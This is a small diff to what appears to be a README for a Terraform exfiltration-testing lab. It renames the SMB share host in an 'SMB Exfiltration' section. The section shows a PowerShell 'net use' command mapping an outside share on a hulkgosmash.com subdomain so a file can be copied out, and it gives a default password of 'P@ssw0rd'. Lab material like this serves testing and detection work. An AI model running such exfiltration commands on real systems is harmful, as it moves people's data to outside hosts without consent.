@@ -442,7 +442,7 @@ sha256sum /home/rdpuser/Desktop/exfil.txt
 
 ### SMB Exfiltration
 
-Be sure to modify the domain in the `net use x: \\exfil.hulkgosmash.com\share /user:smbuser` statement to match your own then copy the file. As before if not specified as a Terraform parameter the password will be `P@ssw0rd`. 
+Be sure to modify the domain in the `net use x: \\exfiltracer123.hulkgosmash.com\share /user:smbuser` statement to match your own then copy the file. As before if not specified as a Terraform parameter the password will be `P@ssw0rd`. 
 
 ```powershell
 net use x: \\exfiltracer123.hulkgosmash.com\share /user:smbuser
